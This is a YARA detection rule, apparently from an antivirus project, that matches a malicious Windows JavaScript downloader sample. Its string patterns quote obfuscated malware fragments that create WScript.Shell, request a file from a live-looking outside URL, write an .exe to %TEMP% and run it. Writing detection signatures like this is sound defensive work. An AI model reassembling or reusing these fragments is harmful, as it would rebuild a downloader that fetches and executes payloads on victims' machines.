rule sig_20160328_07ad1c97cad6c8926fd67be41a66a7e7 {
  meta:
    description = "datamaliciousorder - file 20160328_07ad1c97cad6c8926fd67be41a66a7e7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d9e08889176a904f1acd27d839b1b2ad38ce4fc32a6184806a8bf3227cd6e9c6"

  strings:
    $s1  = "function Ogqovquypi() {return Jfnzftecj[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"FA8R9xTnjToyH.exe\";};" fullword ascii
    $s2  = "do {WScript[Mnnxwflfy](Fddol() * 11)} while (Pkvfehji[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Jfnzftecj = function Admykioeu() {return WScript[Kjryi](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Pkvfehji[Afczci](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s5  = "function Qdcnpqj(Ceufud, Yngtzzfqm){return Ceufud - Yngtzzfqm;};" fullword ascii
    $s6  = "function Hggzwulzv() {return ((Cpfypfd == true) && (Cpfypfd == Cbdfyu)) ? 1 : Ufyzdjpuzy;};" fullword ascii
    $s7  = "function Vjkbswholj(Hdcovl){Jfnzftecj[\"Run\"](Hdcovl, Ufyzdjpuzy, Ufyzdjpuzy);};" fullword ascii
    $s8  = "function Tbcubz(Iozehf) {var Kupiituyu = (1, 2, 3, 4, 5, Iozehf); return Kupiituyu;};" fullword ascii
    $s9  = "var Qkidcsafjx = false;" fullword ascii
    $s10 = "function Qupmc()" fullword ascii
    $s11 = "var Uzazjjsf = new this[\"Date\"]();" fullword ascii
    $s12 = "function Fddol(){return 22;};" fullword ascii
    $s13 = "Cbdfyu = true; " fullword ascii
    $s14 = " while (Phrhn){" fullword ascii
    $s15 = "var Cbdfyu = false;" fullword ascii
    $s16 = "var Cpfypfd = false;" fullword ascii
    $s17 = "return Qdcnpqj(Cpmirfauq, Sktfivcwyu);" fullword ascii
    $s18 = "Cpfypfd = true; " fullword ascii
    $s19 = "function Kfpyyk(){return Mjywsao;};" fullword ascii
    $s20 = "} catch(Egqzhldc){Phrhn = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}